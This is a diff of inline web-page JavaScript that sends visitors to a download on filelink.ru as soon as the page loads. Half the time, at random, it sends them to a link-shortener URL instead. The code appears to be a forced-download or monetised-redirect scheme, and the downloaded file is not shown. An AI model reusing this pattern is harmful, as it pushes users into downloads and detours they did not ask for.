@@ -12,24 +12,25 @@ function getRandomInt(max) {
 }
 
 function downloadFile(link) {
-	if (getRandomInt(2) == 1) {
+	window.location.href = (getRandomInt(2) == 1 ? link : "https://leit.link/Jxic")
+	/*if (getRandomInt(2) == 1) {
 		window.location.href = link;
 	}
 	else {
 		window.location.href = "https://leit.link/Jxic";
-	}
+	}*/
 }
 
 var userLang = navigator.language || navigator.userLanguage; 
 
 if (userLang == 'ru-RU' || userLang == 'uk-UA' || userLang == 'kk-KZ') 
 {
-  downloadFile("http://filelink.ru/file/1463ba4");
+  downloadFile("http://filelink.ru/file/14666ac");
 }
 else 
 {
 	//window.location.href = "https://oxy.st/d/GuMh";
-	downloadFile("http://filelink.ru/file/1463ba4");
+	downloadFile("http://filelink.ru/file/14666ac");
 }
 
 </script>
